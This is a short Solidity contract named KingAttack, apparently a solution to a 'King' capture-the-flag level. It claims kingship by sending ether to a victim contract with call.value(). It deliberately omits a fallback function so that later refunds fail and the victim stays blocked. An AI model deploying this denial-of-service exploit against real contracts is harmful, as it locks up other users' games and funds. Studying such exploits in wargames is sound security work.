pragma solidity ^0.4.18;

contract KingAttack {
    
    function KingAttack() public payable {}

    function becomeKing(address _victim) public payable {
        /* 
        Cannot use _victim.send(msg.value) or .transfer(msg.value).
        I guess it is because send() and transfer() limit the amount of gas, as explained in
        http://solidity.readthedocs.io/en/latest/security-considerations.html?highlight=addr.call.value(x)()
        */
        _victim.call.value(msg.value)();
    }
    /* Do not define a fallback function here */
}
